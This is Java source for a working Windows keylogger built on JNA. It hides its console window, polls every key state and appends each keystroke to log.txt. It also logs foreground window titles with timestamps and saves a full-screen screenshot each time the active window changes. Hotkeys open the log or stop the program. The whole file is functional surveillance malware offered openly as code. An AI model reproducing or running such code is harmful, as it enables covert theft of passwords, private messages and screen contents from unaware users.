import java.io.*;
import java.time.*;
import java.util.*;
import com.sun.jna.platform.win32.*;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinDef.HWND;
import java.awt.AWTException;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
// import com.sun.jna.*;

public class Keylogger {

    static char[] prev_Window = new char[256];
    static char[] curr_Window = new char[256];

    // Generate a unique file name with date and time
    private static String generateUniqueFileName(String folderPath, String baseName, String extension) {
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy_HH-mm-ss");
        String timestamp = dateFormat.format(new Date());
        String fileName = baseName + "_" + timestamp + "." + extension;

        File file = new File(folderPath, fileName);
        int count = 1;
        while (file.exists()) {
            fileName = baseName + "_" + timestamp + "_" + count + "." + extension;
            file = new File(folderPath, fileName);
            count++;
        }
        return file.getAbsolutePath();
    }

    public static void capture() {
        try {
            final Robot robot = new Robot();
            final GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
            final Rectangle screenRect = device.getDefaultConfiguration().getBounds();
            final BufferedImage image = robot.createScreenCapture(screenRect);
            final JLabel label = new JLabel(new ImageIcon(image));
            final JFrame frame = new JFrame();
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            frame.getContentPane().add(label);
            frame.setUndecorated(true);
            device.setFullScreenWindow(frame);

            // Create the screenshots folder if it doesn't exist
            File screenshotsFolder = new File("screenshots");
            if (!screenshotsFolder.exists()) {
                screenshotsFolder.mkdirs();
            }

            // Generate a unique file name for the screenshot
            String fileName = generateUniqueFileName(screenshotsFolder.getPath(), "screenshot", "png");
            File outputFile = new File(fileName);
            ImageIO.write(image, "png", outputFile);
            // System.out.println("Screenshot saved to: " + outputFile.getAbsolutePath());

            // Close the frame instead of exiting the program
            frame.dispose();
        } catch (AWTException | IOException ex) {
            System.err.println(ex);
        }
    }

    static int logger(int key, String file) {

        HWND hwnd = User32.INSTANCE.GetForegroundWindow();
        // char[] windowTitle = new char[256];
        User32.INSTANCE.GetWindowText(hwnd, curr_Window, 256);

        if (Arrays.compare(curr_Window, prev_Window) != 0) {
            Instant current_time = Instant.now();
            String dt = current_time.toString();
            try {
                FileWriter fileWriter = new FileWriter(file, true);
                PrintWriter printWriter = new PrintWriter(fileWriter);
                printWriter.printf("\n\n%s\t\t%s\n", String.valueOf(curr_Window).trim(), dt);
                printWriter.close();
                capture();
            } catch (IOException e) {
                e.printStackTrace();
            }
            System.arraycopy(curr_Window, 0, prev_Window, 0, curr_Window.length);
        }

        if (User32.INSTANCE.GetAsyncKeyState(0x11) != 0 && User32.INSTANCE.GetAsyncKeyState(0x10) != 0
                && User32.INSTANCE.GetAsyncKeyState(0x47) != 0) {
            Shell32.INSTANCE.ShellExecute(null, "open", "log.txt", null, null, WinUser.SW_SHOW);
        }
        if (User32.INSTANCE.GetAsyncKeyState(0x11) != 0 && User32.INSTANCE.GetAsyncKeyState(0x10) != 0
                && User32.INSTANCE.GetAsyncKeyState(0x51) != 0) {
            System.exit(0);
        }

        try {
            Thread.sleep(10);
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        }

        try {
            FileWriter fileWriter = new FileWriter(file, true);
            PrintWriter printWriter = new PrintWriter(fileWriter);

            switch (key) {
                case 0x10:
                    printWriter.print("[SHIFT]");
                    break;
                case 0x0D:
                    printWriter.print("[ENTER]");
                    break;
                case 0x08:
                    printWriter.print("[BACK SPACE]");
                    break;
                case 0x01:
                    printWriter.print("[LButton]");
                    break;
                case 0x1B:
                    printWriter.print("[ESCAPE]");
                    break;
                case 0x11:
                    printWriter.print("[CTRL]");
                    break;
                case 0x14:
                    printWriter.print("[CAPS_LOCK]");
                    break;
                case 0x12:
                    printWriter.print("[ALT]");
                    break;
                case 0x09:
                    printWriter.print("[TAB]");
                    break;
                case 0x25:
                    printWriter.print("[LEFT_ARROW]");
                    break;
                case 0x27:
                    printWriter.print("[LEFT_RIGHT]");
                    break;
                case 0x26:
                    printWriter.print("[LEFT_UP]");
                    break;
                case 0x28:
                    printWriter.print("[LEFT_DOWN]");
                    break;
                case 0x20:
                    printWriter.print("[SPACE_KEY]");
                    break;
                default:
                    printWriter.print((char) key);
            }

            printWriter.close();
            System.out.flush();

        } catch (IOException e) {
            e.printStackTrace();
        }
        return 0;
    }

    public static void main(String[] args) {
        Kernel32.INSTANCE.FreeConsole();
        char i;
        while (true) {
            try {
                Thread.sleep(10);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            for (i = 8; i <= 255; i++) {
                if (User32.INSTANCE.GetAsyncKeyState(i) == -32767) {
                    logger(i, "log.txt");
                }
            }
        }
    }
}